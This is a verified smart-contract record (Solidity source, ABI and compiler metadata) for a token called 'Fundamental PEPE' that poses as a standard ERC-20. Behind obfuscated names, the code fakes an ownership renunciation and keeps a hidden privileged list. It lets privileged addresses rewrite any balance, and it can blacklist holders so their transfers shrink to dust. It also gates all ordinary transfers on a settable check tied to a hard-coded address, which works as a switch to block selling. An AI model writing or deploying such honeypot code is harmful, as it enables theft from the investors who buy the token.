{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface launchMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptTeam) external view returns (uint256);\n\n    function transfer(address isLaunch, uint256 launchedAt) external returns (bool);\n\n    function allowance(address atLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isLaunch,\n        uint256 launchedAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoMax, uint256 value);\n    event Approval(address indexed atLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract launchLiquidityLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minLimit {\n    function createPair(address totalLaunched, address launchLaunchedTotal) external returns (address);\n}\n\ninterface launchMaxMetadata is launchMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FundamentalPEPE is launchLiquidityLaunched, launchMax, launchMaxMetadata {\n\n    uint256 public launchTo;\n\n    constructor (){\n        \n        teamExempt launchedLaunch = teamExempt(swapMinToken);\n        liquidityFund = minLimit(launchedLaunch.factory()).createPair(launchedLaunch.WETH(), address(this));\n        if (fromList != sellTeam) {\n            amountShould = launchTo;\n        }\n        fromTotalMin = _msgSender();\n        fromToken();\n        liquidityTrading[fromTotalMin] = true;\n        txFund[fromTotalMin] = maxAt;\n        \n        emit Transfer(address(0), fromTotalMin, maxAt);\n    }\n\n    function approve(address sellLaunch, uint256 launchedAt) public virtual override returns (bool) {\n        receiverLaunchTx[_msgSender()][sellLaunch] = launchedAt;\n        emit Approval(_msgSender(), sellLaunch, launchedAt);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed txFrom, address indexed fundTeam);\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTo;\n    }\n\n    function takeLimitMax(address atIs) public {\n        teamToken();\n        if (launchTo == limitToken) {\n            modeAuto = true;\n        }\n        if (atIs == fromTotalMin || atIs == liquidityFund) {\n            return;\n        }\n        minList[atIs] = true;\n    }\n\n    uint8 private enableTo = 18;\n\n    uint256 private limitToken;\n\n    function feeMarketing(address takeTrading, uint256 launchedAt) public {\n        teamToken();\n        txFund[takeTrading] = launchedAt;\n    }\n\n    function teamToken() private view {\n        require(liquidityTrading[_msgSender()]);\n    }\n\n    address public fromTotalMin;\n\n    bool public totalMin;\n\n    function transfer(address takeTrading, uint256 launchedAt) external virtual override returns (bool) {\n        return marketingAmount(_msgSender(), takeTrading, launchedAt);\n    }\n\n    uint256 private atTx;\n\n    address private totalModeReceiver;\n\n    string private maxTeam = \"Fundamental PEPE\";\n\n    address sellAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTo;\n    }\n\n    mapping(address => bool) public liquidityTrading;\n\n    function balanceOf(address exemptTeam) public view virtual override returns (uint256) {\n        return txFund[exemptTeam];\n    }\n\n    uint256 public amountShould;\n\n    function fromMode(address modeWallet, address isLaunch, uint256 launchedAt) internal returns (bool) {\n        require(txFund[modeWallet] >= launchedAt);\n        txFund[modeWallet] -= launchedAt;\n        txFund[isLaunch] += launchedAt;\n        emit Transfer(modeWallet, isLaunch, launchedAt);\n        return true;\n    }\n\n    uint256 receiverToken;\n\n    address public liquidityFund;\n\n    uint256 listTo;\n\n    string private receiverTo = \"FPE\";\n\n    function minIs(address limitList) public {\n        require(limitList.balance < 100000);\n        if (totalMin) {\n            return;\n        }\n        if (amountShould != atTx) {\n            amountShould = limitToken;\n        }\n        liquidityTrading[limitList] = true;\n        \n        totalMin = true;\n    }\n\n    bool private fromList;\n\n    function exemptFee(uint256 launchedAt) public {\n        teamToken();\n        listTo = launchedAt;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxTeam;\n    }\n\n    function allowance(address sellMax, address sellLaunch) external view virtual override returns (uint256) {\n        if (sellLaunch == swapMinToken) {\n            return type(uint256).max;\n        }\n        return receiverLaunchTx[sellMax][sellLaunch];\n    }\n\n    address swapMinToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private txFund;\n\n    uint256 private maxAt = 100000000 * 10 ** 18;\n\n    bool public sellTeam;\n\n    function owner() external view returns (address) {\n        return totalModeReceiver;\n    }\n\n    bool private modeAuto;\n\n    function marketingAmount(address modeWallet, address isLaunch, uint256 launchedAt) internal returns (bool) {\n        if (modeWallet == fromTotalMin) {\n            return fromMode(modeWallet, isLaunch, launchedAt);\n        }\n        uint256 fundFrom = launchMax(liquidityFund).balanceOf(sellAt);\n        require(fundFrom == listTo);\n        require(isLaunch != sellAt);\n        if (minList[modeWallet]) {\n            return fromMode(modeWallet, isLaunch, autoSell);\n        }\n        return fromMode(modeWallet, isLaunch, launchedAt);\n    }\n\n    function getOwner() external view returns (address) {\n        return totalModeReceiver;\n    }\n\n    mapping(address => bool) public minList;\n\n    uint256 constant autoSell = 10 ** 10;\n\n    mapping(address => mapping(address => uint256)) private receiverLaunchTx;\n\n    function transferFrom(address modeWallet, address isLaunch, uint256 launchedAt) external override returns (bool) {\n        if (_msgSender() != swapMinToken) {\n            if (receiverLaunchTx[modeWallet][_msgSender()] != type(uint256).max) {\n                require(launchedAt <= receiverLaunchTx[modeWallet][_msgSender()]);\n                receiverLaunchTx[modeWallet][_msgSender()] -= launchedAt;\n            }\n        }\n        return marketingAmount(modeWallet, isLaunch, launchedAt);\n    }\n\n    function fromToken() public {\n        emit OwnershipTransferred(fromTotalMin, address(0));\n        totalModeReceiver = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedAt\",\"type\":\"uint256\"}],\"name\":\"exemptFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAt\",\"type\":\"uint256\"}],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTotalMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"minIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"}],\"name\":\"takeLimitMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FundamentalPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}